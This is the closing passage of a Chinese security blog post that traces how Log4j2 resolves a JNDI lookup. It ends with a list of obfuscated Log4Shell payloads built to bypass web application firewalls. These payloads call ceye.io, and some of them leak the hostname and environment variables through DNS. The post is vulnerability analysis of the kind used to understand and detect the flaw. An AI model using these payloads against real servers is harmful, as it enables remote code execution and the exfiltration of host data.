+<p><img src="/images/image-20230810151212154.png" alt="image-20230810151212154"></p>
+<p>接着就是继续循环查找后缀匹配器</p>
+<p><img src="/images/image-20230810151343284.png" alt="image-20230810151343284"></p>
+<p><code>bufName</code> 变量就是去掉前缀和后缀匹配器后的字符串，然后再调用了 <code>substitute</code> 方法</p>
+<p><img src="/images/image-20230810153616999.png" alt="image-20230810153616999"></p>
+<p>还是到了这个方法里，再重复上面的操作，一直找前缀匹配器找不到，后面接着查找分隔符匹配器也没有找到，然后就是调用 <code>resolveVariable</code> 方法解析变量</p>
+<p><img src="/images/image-20230810154036596.png" alt="image-20230810154036596"></p>
+<p><img src="/images/image-20230810154238543.png" alt="image-20230810154238543"></p>
+<p>在该方法里获取了变量解析器，解析器支持的Lookup如上图所示</p>
+<p><img src="/images/image-20230810154845217.png" alt="image-20230810154845217"></p>
+<p>对 <code>var</code> 的字符串以 <code>:</code> 分割，获取了后面的内容，并且获取字符串的前缀 <code>jndi</code>，再从 <code>StrLookupMap</code> 对象中查找对应的 <code>Lookup</code> 类，接着就是调用了 <code>JndiLookup</code> 类的 <code>lookup</code> 方法</p>
+<p><img src="/images/image-20230810155214967.png" alt="image-20230810155214967"></p>
+<p>然后就是获取了默认的JNDI管理器，通过该管理器调用 <code>lookup</code> 方法</p>
+<p><img src="/images/image-20230810155426911.png" alt="image-20230810155426911"></p>
+<p><img src="/images/image-20230810155634899.png" alt="image-20230810155634899"></p>
+<p>这里就是调用了原生的 <code>lookup</code> 方法，后面就是JNDI注入了，执行了恶意ldap服务上的恶意代码，最终成功执行</p>
+<h2 id="Payload变形绕过WAF"><a href="#Payload变形绕过WAF" class="headerlink" title="Payload变形绕过WAF"></a>Payload变形绕过WAF</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>127.0.0.1<span class="token operator">:</span>1389<span class="token operator">/</span>a&#125;</span>
+<span class="token variable">$&#123;$&#123;<span class="token operator">:</span><span class="token operator">:-</span>j&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>n&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>r&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>m&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>i&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;<span class="token operator">:</span><span class="token operator">:-</span>j&#125;</span>ndi:rmi://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi<span class="token operator">:</span>rmi<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ceye.io&#125;</span>
+<span class="token variable">$&#123;$&#123;lower<span class="token operator">:</span>jndi&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;lower<span class="token operator">:</span>rmi&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower<span class="token operator">:</span>$&#123;lower<span class="token operator">:</span>jndi&#125;</span><span class="token punctuation">&#125;</span>:<span class="token variable">$&#123;lower<span class="token operator">:</span>rmi&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower<span class="token operator">:</span>j&#125;</span><span class="token variable">$&#123;lower<span class="token operator">:</span>n&#125;</span><span class="token variable">$&#123;lower<span class="token operator">:</span>d&#125;</span>i:<span class="token variable">$&#123;lower<span class="token operator">:</span>rmi&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower<span class="token operator">:</span>j&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>n&#125;</span><span class="token variable">$&#123;lower<span class="token operator">:</span>d&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;lower<span class="token operator">:</span>r&#125;</span>m<span class="token variable">$&#123;lower<span class="token operator">:</span>i&#125;</span><span class="token punctuation">&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;upper<span class="token operator">:</span>jndi&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;upper<span class="token operator">:</span>rmi&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;upper<span class="token operator">:</span>j&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>n&#125;</span><span class="token variable">$&#123;lower<span class="token operator">:</span>d&#125;</span>i:<span class="token variable">$&#123;upper<span class="token operator">:</span>rmi&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;upper<span class="token operator">:</span>j&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>n&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>d&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;lower<span class="token operator">:</span>r&#125;</span>m<span class="token variable">$&#123;lower<span class="token operator">:</span>i&#125;</span><span class="token punctuation">&#125;</span>://ceye.io/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;<span class="token operator">:</span><span class="token operator">:-</span>j&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>n&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>l&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>a&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>p&#125;</span>://<span class="token variable">$&#123;hostName&#125;</span>.ceye.io<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>j&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>n&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>l&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>a&#125;</span><span class="token variable">$&#123;upper<span class="token operator">:</span><span class="token operator">:-</span>p&#125;</span>://<span class="token variable">$&#123;hostName&#125;</span>.ceye.io<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;<span class="token operator">:</span><span class="token operator">:-</span>j&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>n&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>i&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>l&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>d&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>a&#125;</span><span class="token variable">$&#123;<span class="token operator">:</span><span class="token operator">:-</span>p&#125;</span>://<span class="token variable">$&#123;hostName&#125;</span><span class="token builtin class-name">.</span><span class="token variable">$&#123;env<span class="token operator">:</span>COMPUTERNAME&#125;</span><span class="token builtin class-name">.</span><span class="token variable">$&#123;env<span class="token operator">:</span>USERDOMAIN&#125;</span><span class="token builtin class-name">.</span><span class="token variable">$&#123;env&#125;</span>.ceye.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/16200105.html">https://www.cnblogs.com/zpchcbd/p/16200105.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/">https://drun1baby.top/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/</a></p>
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/91ba9d0d39fd.html">https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/91ba9d0d39fd.html</a>
+        </p>
+        
+    </div>
+ 
+    <div class="post-footer__meta"><p>文章更新于 2023-08-26</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/Log4j2/" class="post-tags__link button"># Log4j2</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/9ca83d5eef7a.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            Apache Shiro 550反序列化漏洞分析
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            Fastjson后续版本绕过分析
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
